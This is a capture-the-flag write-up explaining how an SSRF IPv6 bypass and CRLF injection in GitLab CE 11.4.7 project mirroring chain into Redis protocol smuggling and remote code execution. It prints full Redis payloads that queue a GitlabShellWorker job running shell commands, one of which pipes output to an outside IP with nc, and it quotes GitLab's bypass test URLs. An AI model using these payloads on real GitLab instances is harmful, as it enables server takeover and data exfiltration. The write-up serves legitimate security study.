
Lets exploit gitlab/gitlab-ce:11.4.7-ce.0 ssrf+crlf from RWCTF (from code audit to rce) 1-day

## SETUP

we were given a [Docker-Componse file](./docker-componse.yml) file  , so set it up

create a `steg0_initial_root_password` file with content 5f98f181c96a69e4bace472640043e4222d17549 (this is secret password)

$ docker-compose up -d 
run the command being in docker-compose file direcroty

Visit `http:/0:5080` and you will have gitlab running

## APPROCH

So we need a RCE/File Read so that we can get flag.

There was a previous [RCE](https://gitlab.com/gitlab-org/gitlab-ce/issues/41293) reported to gitlab.

The RCE was done chaining:
* SSRF in webhooks so we can touch intranet(local services) on that network
* CRLF in webhooks causing protocol smuggling allowing us to make calls to redis with a payload causing RCE

## Webhook Functionality 

Webhook is Hook which is called whenever there is certain event.
Example : On PUSH CODE => CALL WEBHOOK TO DO A CICD UPDATE OR JUST MAIL SOMEONE THAT CODE IS PUSHED from USER-X


Now this Webhook is vulnerable to ssrf with crlf => so we can make a request to redis with following payload to push a task in to redis queue which ruby keep checking and perform action as mentioned in queue

PAYLOAD = 
```
A

 multi

 sadd resque:gitlab:queues system_hook_push

lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"

exec
```

So something like

my.gitlab.com/?webhook[url]=127.0.0.1&webhook[token]=PAYLOAD

this will push our task into system_hook_push which is a task queue gitlab keeps checking the queue for active task

it will take our task which will call `GitlabShellWorker` with arguments `class_eval` and `"open(\'|whoami | nc 192.241.233.143 80\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}`

> WHY GitlabShellWorker
THIS IS Code to GitlabShellWorker
```
class GitlabShellWorker
	include ApplicationWorker
	include Gitlab:ShellAdapter

		def perform(action,*arg)
			gitlab_shell.__send__(action,*arg)
		end
	end
```

> `perform` is special method in ruby that checks active tasks in queue and execute them

So this way we end up inserting task to REDIS  and execute it


THIS WAS PREV to PREV version exploit, it was fixed in `gitlab/gitlab-ce:11.4.7-ce.0` .

But know we have to see what bugs where patched in `gitlab/gitlab-ce:11.4.7-ce.0` and if it had SSRF nd CRLF we get RCE and we are done 
So [these](https://about.gitlab.com/2018/11/28/security-release-gitlab-11-dot-5-dot-1-released/) are all patches that were made in this(gitlab/gitlab-ce:11.4.7-ce.0) version and they did fixed 

* SSRF in Webhooks(again? Maybe prev fix bypass)
	* so looking into previous commit we look for something like "ssrf fix" and we do get a commit sayiing [security-11-5-fix-webhook-ssrf-ipv6' into](https://github.com/gitlabhq/gitlabhq/commit/a9f5b22394954be8941566da1cf349bb6a179974#diff-9e66ca5e5564156b96d5a64c76a74c1f)	
	* So it indeed was a IPV6 bypass

* CRLF Injection in Project Mirroring
	* So there is CRLF too but in project mirroing , again looking through prev comit we get the actual fix ['security-fj-crlf-injection' into 'master'](https://github.com/gitlabhq/gitlabhq/commit/c0e5d9afee57745a79c072b0f57fdcbe164312da)

SSRF and CRLF at different parts of the code wont help bcz we need API to be vulnerable to both .

So when we see the code fixed for SSRF, its actually `lib/gitlab/url_blocker.rb` 
so it was a global helper file that was used everywhere(even in project mirroring) to block SSRF

So in short Project mirroring uses same protection defined in `lib/gitlab/url_blocker.rb`  as used by webhooks so SSRF persist also in PRoject mirroring.
Great now we have everything to get RCE
SSRF+CRLF in project mirroring

## EXPLOITING

So lets see how project mirroring works( from https://docs.gitlab.com/ee/workflow/repository_mirroring.html):

```
For an existing project, you can set up push mirroring as follows:

> Navigate to your project’s Settings > Repository and expand the Mirroring repositories section.
> Enter a repository URL.    <== so this is SSRF + CRLF(INJECTION POINT)
Select Push from the Mirror direction dropdown.
Select an authentication method from the Authentication method dropdown, if necessary.
Check the Only mirror protected branches box, if necessary.
Click the Mirror repository button to save the configuration.
```
Basiclly at `(/<namespace>/<projectname>/settings/repository#js-push-remote-settings)`


Finding out what works is as simple as looking at the tests written to check for the bug after the fix was deployed.
```
  it 'returns true for loopback IPs' do
      expect(described_class.blocked_url?('https://[0:0:0:0:0:ffff:127.0.0.1]/foo/foo.git')).to be true
      expect(described_class.blocked_url?('https://[::ffff:127.0.0.1]/foo/foo.git')).to be true
      expect(described_class.blocked_url?('https://[::ffff:7f00:1]/foo/foo.git')).to be true
      expect(described_class.blocked_url?('https://[0:0:0:0:0:ffff:127.0.0.2]/foo/foo.git')).to be true
      expect(described_class.blocked_url?('https://[::ffff:127.0.0.2]/foo/foo.git')).to be true
      expect(described_class.blocked_url?('https://[::ffff:7f00:2]/foo/foo.git')).to be true
  end
```

Use CRLFs to inject redis commands(Protocol smuggling from HTTP to redis).
Which is as simple as adding \n or \r to our URL(as we can see in test).
```
  shared_context 'invalid urls' do
        let(:urls_with_CRLF) do
          ["http://127.0.0.1:333/pa\rth",
           "http://127.0.0.1:333/pa\nth",
           "http://127.0a.0.1:333/pa\r\nth",
           "http://127.0.0.1:333/path?param=foo\r\nbar",
           "http://127.0.0.1:333/path?param=foo\rbar",
           "http://127.0.0.1:333/path?param=foo\nbar",
           "http://127.0.0.1:333/pa%0dth",
           "http://127.0.0.1:333/pa%0ath",
           "http://127.0a.0.1:333/pa%0d%0th",
           "http://127.0.0.1:333/pa%0D%0Ath",
           "http://127.0.0.1:333/path?param=foo%0Abar",
           "http://127.0.0.1:333/path?param=foo%0Dbar",
           "http://127.0.0.1:333/path?param=foo%0D%0Abar"]
        end
      end
```

So @ injection point payload would be
```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/\n\n

multi

sadd resque:gitlab:queues system_hook_push

lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|whoami > /tmp/a \').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"4552c3b1225428b18682c901\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"

exec

exec

```
Putting that in mirror functionality results in a 500 returned from gitlab. This happens due to gitlab trying to render our URL and in failing to do so, refusing to respond with anything meaningful

That’s not helpful given that we still need to trigger the mirror by clicking the little refresh button (or just sending POST to update_now?sync_remote=true)
Doing the latter gives us full RCE.

## Little on Protocol Smuggling
So basically if we can inject CR-LF anywhere in request headers we get protocol smuggling

>  Whats protocol smuggling?

Basically making a call in 1 protocol that is understood by another protocol. In this example we made a HTTP call which is understood by redis.

So if there is newline thing(CRLF) anywhere  in header part, redis ignore all error and execute the redis command

```
GET /[EXPLOIT-1] HTTP/1.1     <= can be at URL
Host: 127.0.0.1:6379
Cookie: [EXPLOIT-2]           <= newline at cookie and we get CRLF

data:[EXPLOIT-3] 			  <= or some data we control
```

So if we make a HTTP call to redis, obviously it donot understand HTTP protocol but the fun part is it doesnt give error and if it finds valid redis command it will even execute it.

so [EXPLOIT-n] can be like

```
A\r\n\n
multi
lpush task "Asdf"
exec

A\n\n
```

ACTUAL request
```
GET /A\r\n\n\multi\nlpush\n task "asdf"\nexec\nA\n\n HTTP/1.1
Host: 127.0.0.1:6379
```

will end up inserting the value "Asdf" in variable "task" in redis



#### Reference https://desc0n0cid0.blogspot.com/2019/01/chaining-2-low-impact-bugs-into-gitlab.html

=======
